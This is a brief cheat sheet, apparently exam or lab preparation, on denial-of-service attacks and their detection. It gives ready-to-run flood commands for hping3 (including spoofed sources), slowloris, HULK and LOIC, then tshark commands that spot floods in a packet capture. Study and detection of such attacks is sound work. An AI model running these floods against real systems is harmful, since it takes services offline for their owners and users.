# 💥 DoS ATTACK KARO / DETECT KARO

---

## CASE 1: SYN Flood (hping3)
```bash
hping3 -S --flood -V -p 80 <TARGET_IP>
hping3 -S --flood -p 80 --rand-source <TARGET_IP>
```

## CASE 2: Slowloris (HTTP)
```bash
slowloris <TARGET_IP> -p 80 -s 500
```

## CASE 3: HULK (HTTP GET Flood)
```bash
python3 hulk.py http://<TARGET_IP>/
```

## CASE 4: LOIC (GUI)
```bash
# Launch LOIC → Enter target IP → Select method (TCP/UDP/HTTP) → Start
```

---

## DETECT DoS in PCAP:
```bash
# Top source IPs (flooder)
tshark -r dos.pcap -T fields -e ip.src | sort | uniq -c | sort -rn | head -5

# SYN flood detect
tshark -r dos.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" | wc -l

# ICMP flood
tshark -r dos.pcap -Y "icmp" | wc -l
```

---

## QUICK DECISION:
```
DoS question
  ├─ Perform SYN flood → hping3 -S --flood
  ├─ HTTP slow → slowloris
  ├─ HTTP GET flood → HULK
  ├─ Detect in PCAP → count SYN packets / top source IP
  └─ Question asks tool name → match attack type to tool
```
